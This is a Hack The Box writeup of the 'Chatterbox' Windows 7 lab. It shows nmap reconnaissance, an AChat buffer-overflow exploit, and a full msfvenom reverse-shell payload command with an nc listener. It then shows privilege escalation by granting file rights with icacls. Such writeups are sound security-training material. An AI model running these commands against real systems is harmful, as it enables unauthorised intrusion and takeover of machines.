---
layout: post
title:  "Chatterbox Writeup - Hack The Box"
date:   2025-06-20
desc: ""
keywords: "HTB,OSCP,Windows,AChat,Icacls,PowerUp,Medium"
categories: [HTB]
tags: [HTB,OSCP,Windows,AChat,Icacls,PowerUp,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I come from making a series of **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machines that have cost me a lot of time, effort, plus I'm still processing the concepts to assimilate them, but that's how the labs of this excellent platform are. The **Chatterbox** is not very complex, that's why it is rate as **Medium** by the community, besides having a **Windows** OS installed, which is my **favorite target** to exploit. Being able to modify or create new scripts to exploit security **bugs** or **vulnerabilities** is something I love about these labs, so I just have to spawn the box to start my writeup, here I go.

<br /><br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I check that my connectivity to the lab is already established through my **VPN** client by sending a trace with `ping` - everything is working correctly. Then with **[hack4u's](https://hack4u.io/){:target="_blank"}** `whichSystem.py` tool I get the possible **OS** installed on the target machine (**Windows**), and I can already start my **Reconnaissance** phase with `nmap`, first to list the open ports using **TCP scan** first. Then I can appeal to `nmap` scripts to find out about the services being offered and leak more information about them - mainly their **versions**. There are two pieces of information that immediately catch my eye, the **Windows version** (**7 Professional**) and a service available on port **9256** (**AChat**) that I don't know about. If I try to enumerate the **RPC** and **SMB** protocols, with `rpcclient`, `smbclient` or `smbmap` I can't do it without valid credentials.

```bash
ping -c 1 10.10.10.74
whichSystem.py 10.10.10.74
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.74 -oG allPorts
nmap -sCV -p135,139,445,9256,49154,49155,49156,49157 10.10.10.74 -oN targeted
cat targeted
#    --> Windows 7 Professional 7601 Service Pack 1                                    Vulnerable to EternalBlue?
#    --> OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
#    --> 9256/tcp  open  achat        AChat chat system

rpcclient -U "" 10.10.10.74
smbclient -L 10.10.10.74 -N
smbmap -H 10.10.10.74 -u 'null'
```

<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Knowing that the Windows OS version is **7** (**very old**), it is vulnerable to the **[EternalBlue](https://www.hypr.com/security-encyclopedia/eternalblue){:target="_blank"}** exploit but I need to have access via **SMB**, so I try to find vulnerabilities in this protocol using `nmap` scripts, but as I imagined I can't find anything because the access is denied. I focus on the **[AChat](https://achat.en.download.it/){:target="_blank"}** service and with `searchsploit` I find some exploits, but although I don't have the version I can try to use one of them that is developed in **Python** and exploits a **Buffer Overflow**. Before downloading it, I analyze the script and I notice that it uses `msfvenom` to create a shellcode that executes a command (**calc.exe**) and exports it in **Python** format, also the **IP** of the target is hardcoded.

> **[EternalBlue](https://www.hypr.com/security-encyclopedia/eternalblue){:target="_blank"}** is a Windows exploit created by the **US National Security Agency** (**NSA**) and used in the **2017 WannaCry** ransomware attack. **EternalBlue** exploits a vulnerability in the **Microsoft** implementation of the **Server Message Block** (**SMB**) Protocol. This dupes a Windows machine that has not been patched against the vulnerability into allowing illegitimate data packets into the legitimate network. These data packets can contain malware such as a trojan, ransomware or similar dangerous program.

> **[AChat](https://achat.en.download.it/){:target="_blank"}** is a communication tool designed to facilitate text-based messaging exclusively within a **local area network** (**LAN**). This makes it a suitable choice for small offices, schools, or any environment where internet-based messengers are either unnecessary or prohibited. Its focus on ease of use and minimal system overhead targets productivity without sacrificing computer resources.


```bash
locate *.nse | grep 'smb-'
locate *.nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
nmap --script "vuln and safe" -p445 10.10.10.74
nmap --script smb-vuln\* -p445 10.10.10.74
# :(

searchsploit achat
searchsploit -x windows/remote/36025.py
```

<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To try to exploit the **AChat** service I must modify the exploit, first I will create a new shellcode with `msfvenom` to get a **Reverse Shell** and then I will change the **IP** of the target. Once the changes are done I can open port **443** of my machine with `nc` waiting for the remote connection and run with `python` (choosing the correct version) the exploit, this way I succeed to access the victim machine and the content of the first flag.

```bash
searchsploit -m windows/remote/36025.py
mv 36025.py achat_bof.py
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

cat achat_bof.py | grep -E 'msfvenom|10.10.10.74'
# :)
rlwrap -cAr nc -nlvp 443
python3 achat_bof.py
# :(
python2 achat_bof.py
# :)

whoami
hostname
ipconfig
dir /s user.txt
type C:\Users\Alfred\Desktop\user.txt
```

<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I do my basic system enumeration commands and surf the file system but I don't find much. After surfing for a while without much sense, I remember that many permissions can be misconfigured, so with `icacls` I try first to list the users and their permissions, in different folders and files. Logically in the flag of the **Administrator** user, the only one who has all the privileges is himself, but to my surprise the **Desktop** folder of the **Administrator** has assigned **Full Access** to the user **Alfred** (a **misconfiguration**). So with `icacls` itself I can assign the user **Alfred** full access to the **root.txt** flag and then access its content. Machine finally powned.

### **[icacls](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls){:target="_blank"}**:
> (I) - Inherit. ACE inherited from the parent container.
> (OI) - Object inherit. Objects in this container will inherit this ACE. Applies only to directories.
> (CI) - Container inherit. Containers in this parent container will inherit this ACE. Applies only to directories.
> F - Full access

### To grant the user User1 Delete and Write DAC permissions to a file named Test1, type:
> icacls test1 /grant User1:(d,wdac)

```bash
whoami /priv
whoami /all
net user

type root.txt
# Access is denied.
icacls root.txt
# root.txt CHATTERBOX\Administrator:(F)

icacls Desktop
# CHATTERBOX\Alfred:(I)(OI)(CI)(F)

icacls root.txt /grant alfred:(F)
icacls root.txt
# root.txt CHATTERBOX\Alfred:(F)
type root.txt
```

<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> From my writeup everything would suggest that the machine was not very complex to engage, but it does not reflect all the time I had to enumerate the system, once engaged, to find the right way to **Escalate privileges**. **Windows** machines are my favorite because I don't know most of the technologies it has, plus all the security policies that some misconfigurations can have, which represents a wide attack surface. I kill the box in the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform and go to find my next target.

<br /><br />
<img src="{{ site.img_path }}/chatterbox_writeup/Chatterbox_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
